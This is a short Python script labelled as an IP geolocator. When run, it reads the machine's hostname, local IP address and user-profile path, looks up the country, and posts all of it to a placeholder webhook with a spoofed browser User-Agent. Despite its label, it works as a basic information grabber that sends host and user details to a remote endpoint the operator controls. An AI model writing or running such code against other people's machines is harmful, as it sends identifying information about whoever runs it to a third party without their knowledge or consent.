#Ip geolocator script made by ragoon in python

import json
import urllib.request
import socket
import os


webhook_url = "YOUR_WEBHOOK_URL"

user_profile = os.environ["USERPROFILE"]
hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)

geo_url = f"http://ip-api.com/json/{ip_address}"
with urllib.request.urlopen(geo_url) as response:
    geo_data = json.load(response)
    country = geo_data.get("country", "Unknown")

data = {
    "content": (
        f"IP: {ip_address}\n"
        f"Hostname: {hostname}\n"
        f"User Profile: {user_profile}\n"
        f"Country: {country}"
    )
}

json_data = json.dumps(data).encode("utf-8")

req = urllib.request.Request(
    webhook_url,
    data=json_data,
    headers={
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
)

urllib.request.urlopen(req)
print(f"Sent info: IP {ip_address}, Country {country}")
